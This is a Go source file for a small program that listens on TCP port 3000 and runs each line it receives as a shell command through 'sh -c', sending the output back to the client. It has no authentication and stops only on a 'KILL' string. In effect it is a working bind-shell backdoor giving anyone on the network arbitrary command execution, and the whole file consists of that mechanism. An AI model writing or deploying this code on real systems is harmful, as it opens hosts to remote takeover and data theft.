package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func worker(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	command, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	command = command[:len(command)-1]

	if command == "KILL" {
		log.Fatal("Exiting")
	}

	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func main() {
	port := 3000

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatal("Error starting server:", err)
	}

	log.Println("TCP Server is listening on port", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting connection", err)
			continue
		}

		log.Println("Accepted connection from", conn.RemoteAddr())
		go worker(conn)
	}
}
